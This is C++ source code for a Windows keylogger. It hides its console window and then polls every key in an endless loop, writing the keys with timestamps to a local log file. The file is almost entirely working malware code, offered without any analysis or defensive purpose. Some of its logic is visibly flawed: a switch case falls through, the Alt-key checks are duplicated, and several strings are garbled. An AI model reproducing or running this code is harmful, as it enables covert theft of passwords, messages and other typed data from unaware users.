#include <iostream>
#include <Windows.h>
#include <time.h>
#include <string>
#include <stdlib.h>

using namespace std;


const int KeyBoardValue = 0x80000000;
string GetKeyName(int);
bool JudgeShift();

int main(int argc, char *argv[])
{

	FreeConsole(); //hide window

	string FileName = "./log.txt";
	string KeyName = "";
	time_t t, last_t = 0;
	struct tm *gt;
	int interval;


	gt = gmtime(&last_t);

	if (argc == 2)
	{
		FileName = argv[1];
	}


	while (1)
	{
		Sleep(5);
		for (int i = 8; i <= 255; i++)
		{
			if (GetAsyncKeyState(i) & 1 == 1)               
			{
				KeyName = GetKeyName(i);
				if (KeyName != "") {
					FILE *fp = fopen("./log.txt", "a");

					time(&t);

					interval = t - last_t;

					if (interval > 60) {
						struct tm *gt = gmtime(&t);
						fprintf(fp, "\n%d-%d-%d %02d:%02d:%02d\n%s ", 1900 + gt->tm_year, 1 + gt->tm_mon, gt->tm_mday, 8 + gt->tm_hour, gt->tm_min, gt->tm_sec, KeyName.c_str());
					}
					else if (interval < 5)
					{
						fprintf(fp, "%s", KeyName.c_str());
					}
					else
					{
						fprintf(fp, "%s ",  KeyName.c_str());
					}
					fclose(fp);

					last_t = t;
				}
			}
		}
	}
	return 0;
}




//get key name
string GetKeyName(int NumKey)
{
	bool IS_SHIFT = JudgeShift();
	string revalue = "";

	if (NumKey >= 186 && NumKey <= 222)
		switch (NumKey)
		{
		case 186:
			if (IS_SHIFT)
				revalue = ":";
			else
				revalue = ";";
			break;
		case 187:
			if (IS_SHIFT)
				revalue = "+";
			else
				revalue = "=";
			break;
		case 188:
			if (IS_SHIFT)
				revalue = "<";
			else
				revalue = ",";
			break;
		case 189:
			if (IS_SHIFT)
				revalue = "_";
			else
				revalue = "-";
			break;
		case 190:
			if (IS_SHIFT)
				revalue = ">";
			else
				revalue = ".";
			break;
		case 191:
			if (IS_SHIFT)
				revalue = "?";
			else
				revalue = "/";
			break;
		case 192:
			if (IS_SHIFT)
				revalue = "~";
			else
				revalue = "`";
			break;
		case 219:
			if (IS_SHIFT)
				revalue = "{";
			else
				revalue = "[";
			break;
		case 220:
			if (IS_SHIFT)
				revalue = "|";
			else
				revalue = "\\";
			break;
		case 221:
			if (IS_SHIFT)
				revalue = "}";
			else
				revalue = "]";
			break;
		case 222:
			if (IS_SHIFT)
				revalue = '"';
			else
				revalue = ",";
		default:
			revalue = "error";
			break;
		}


	if (NumKey == VK_ESCAPE) // Exit
		revalue = "[Esc]";
	else if (NumKey == VK_F1) // F1-F12
		revalue = "[F1]";
	else if (NumKey == VK_F2)
		revalue = "[F2]";
	else if (NumKey == VK_F3)
		revalue = "[F3]";
	else if (NumKey == VK_F4)
		revalue = "[F4]";
	else if (NumKey == VK_F5)
		revalue = "[F5]";
	else if (NumKey == VK_F6)
		revalue = "[F6]";
	else if (NumKey == VK_F7)
		revalue = "[F7]";
	else if (NumKey == VK_F8)
		revalue = "[F8]";
	else if (NumKey == VK_F9)
		revalue = "[F9]";
	else if (NumKey == VK_F10)
		revalue = "[F10]";
	else if (NumKey == VK_F11)
		revalue = "[F11]";
	else if (NumKey == VK_F12)
		revalue = "[F12]";
	else if (NumKey == VK_SNAPSHOT) // print
		revalue = "[PrScrn]";
	else if (NumKey == VK_SCROLL) // scroll
		revalue = "[Scroll Lock]";
	else if (NumKey == VK_PAUSE) // pause
		revalue = "[Pause]";
	else if (NumKey == VK_CAPITAL) // caps lock
		revalue = "[Caps Lock]";
	else if (NumKey == 8) //<- backspace
		revalue = "[Backspace]";
	else if (NumKey == VK_RETURN) // enter
		revalue = "[Enter]\n";
	else if (NumKey == VK_SPACE) //space
		revalue = " ";
	else if (NumKey == VK_TAB) // table
		revalue = "[Tab]";
	else if (NumKey == VK_LCONTROL) // left Ctrl
		revalue = "[Ctrl]";
	else if (NumKey == VK_RCONTROL) // right Ctrl
		revalue = "[CTRL]";
	else if (NumKey == VK_LMENU) // left Alt
		revalue = "[Alt]";
	else if (NumKey == VK_LMENU) // right Alt
		revalue = "[ALT]";
	else if (NumKey == VK_LWIN) // left WINDOWS
		revalue = "[Win]";
	else if (NumKey == VK_RWIN) // WINDOWS
		revalue = "[WIN]";
	else if (NumKey == VK_APPS) // ->
		revalue = "ÓÒ¼ü";
	else if (NumKey == VK_INSERT) // insert
		revalue = "[Insert]";
	else if (NumKey == VK_DELETE) // delete
		revalue = "[Delete]";
	else if (NumKey == VK_HOME) // home
		revalue = "[Home]";
	else if (NumKey == VK_END) // end
		revalue = "[End]";
	else if (NumKey == VK_PRIOR) // pageup
		revalue = "[PgUp]";
	else if (NumKey == VK_NEXT) // pagedown
		revalue = "[PgDown]";
	else if (NumKey == VK_CANCEL) // cancel
		revalue = "[Cancel]";
	else if (NumKey == VK_CLEAR) // clear
		revalue = "[Clear]";
	else if (NumKey == VK_SELECT) //Select
		revalue = "[Select]";
	else if (NumKey == VK_PRINT) //Print
		revalue = "[Print]";
	else if (NumKey == VK_EXECUTE) //Execute
		revalue = "[Execute]";

	//----------------------------------------//
	else if (NumKey == VK_LEFT) //left right up down
		revalue = "[¡û]";
	else if (NumKey == VK_RIGHT)
		revalue = "[¡ú]";
	else if (NumKey == VK_UP)
		revalue = "[¡ü]";
	else if (NumKey == VK_DOWN)
		revalue = "[¡ý]";
	else if (NumKey == VK_NUMLOCK)//Num Lock
		revalue = "[NumLock]";
	else if (NumKey == VK_ADD) // Add¡¢Substract¡¢mutiply, dividsion
		revalue = "+";
	else if (NumKey == VK_SUBTRACT)
		revalue = "-";
	else if (NumKey == VK_MULTIPLY)
		revalue = "*";
	else if (NumKey == VK_DIVIDE)
		revalue = "/";
	else if (NumKey == 190 || NumKey == 110) //
		revalue = ".";
	//0-9
	else if (NumKey == VK_NUMPAD0)
		revalue = "0";
	else if (NumKey == VK_NUMPAD1)
		revalue = "1";
	else if (NumKey == VK_NUMPAD2)
		revalue = "2";
	else if (NumKey == VK_NUMPAD3)
		revalue = "3";
	else if (NumKey == VK_NUMPAD4)
		revalue = "4";
	else if (NumKey == VK_NUMPAD5)
		revalue = "5";
	else if (NumKey == VK_NUMPAD6)
		revalue = "6";
	else if (NumKey == VK_NUMPAD7)
		revalue = "7";
	else if (NumKey == VK_NUMPAD8)
		revalue = "8";
	else if (NumKey == VK_NUMPAD9)
		revalue = "9";

	else if (NumKey >= 65 && NumKey <= 90)
	{
		if (GetKeyState(VK_CAPITAL))
		{
			if (IS_SHIFT)
				revalue = NumKey + 32;
			else
				revalue = NumKey;
		}
		else
		{
			if (IS_SHIFT)
				revalue = NumKey;
			else
				revalue = NumKey + 32;
		}
	}

	else if (NumKey >= 48 && NumKey <= 57)
	{
		if (IS_SHIFT)
		{
			switch (NumKey)
			{
			case 48:revalue = ")"; break;
			case 49:revalue = "!"; break;
			case 50:revalue = "@"; break;
			case 51:revalue = "#"; break;
			case 52:revalue = "$"; break;
			case 53:revalue = "%"; break;
			case 54:revalue = "^"; break;
			case 55:revalue = "&"; break;
			case 56:revalue = "*"; break;
			case 57:revalue = "("; break;
			}
		}
		else
		{
			switch (NumKey)
			{
			case 48:revalue = "0"; break;
			case 49:revalue = "1"; break;
			case 50:revalue = "2"; break;
			case 51:revalue = "3"; break;
			case 52:revalue = "4"; break;
			case 53:revalue = "5"; break;
			case 54:revalue = "6"; break;
			case 55:revalue = "7"; break;
			case 56:revalue = "8"; break;
			case 57:revalue = "9"; break;
			}
		}
	}
	return revalue;
}

//check [shift] is down
bool JudgeShift()
{
	int   iShift = GetKeyState(0x10); 
	bool   IS = (iShift & KeyBoardValue) == KeyBoardValue; 
	if (IS)
		return 1;
	else
		return 0;
}
